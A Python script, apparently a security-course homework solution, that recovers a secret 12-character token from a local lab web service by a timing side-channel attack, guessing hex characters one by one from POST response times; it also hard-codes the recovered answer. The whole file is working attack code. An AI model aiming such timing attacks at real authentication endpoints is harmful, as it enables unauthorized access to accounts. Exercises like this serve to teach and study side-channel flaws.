from requests import post
from timeit import timeit
from functools import partial
import json
import string
from tqdm import tqdm
import random

# Set base URL and constants
URL = 'http://0.0.0.0:8080/hw6/ex1'
EMAIL = 'nico@epfl.ch'

# Number of iterations to be done by timeit, 
# since the difference between correct and incorrect 
# characters is huge, only one iteration is needed
NUMBER_TIMEIT = 1

# From the responses, we can see that the token length should be 12
TOKEN_LENGTH = 12

# This string is used to buffer the real letters with
# some others missing to reach the required 12 chars length
RANDOM_STRING = '12345678910'

# Looking at `timeit` times, it is evident that the time it takes
# to process a correct letter is ~0.75. I take 0.74 since
# sometimes it might take slighlty less time
TIME_THRESHOLD = 0.74
SOLUTION = 'b4351d395d2f'

def main():
    
    # Initialize base token
    token = ''

    # Create the space from which picking the password chars
    # Since it is a token, it is likely that will be made of hexdigits
    space = list(string.hexdigits)

    # Shuffle the space to make the distribution more similar to the
    # password one
    random.shuffle(space)

    for i in range(TOKEN_LENGTH):
        # Loop until the right letter is not found
        success = False
        while not success:
        # Iterate over the space characters
            for letter in tqdm(space):
                
                # Get how much time it takes to compute the result and get the result
                elapsed = timeit(lambda: attempt_token(i, letter, token), number=NUMBER_TIMEIT) / NUMBER_TIMEIT

                # Check if the letter is above the threshold
                if elapsed > TIME_THRESHOLD * (i + 1):
                    token += letter
                    success = True
                    
            print(token)
        
        

def attempt_token(i, letter, token):
    # Create a token long as the required one is
    new_token = token + letter + RANDOM_STRING[i:]

    # Create a dict with the data to be sent
    data = {
        'email': EMAIL,
        'token': new_token
    }

    # Make the POST request and return it
    resp = post(URL, json=data)

    return resp.status_code, resp.text

if __name__ == '__main__':
    main()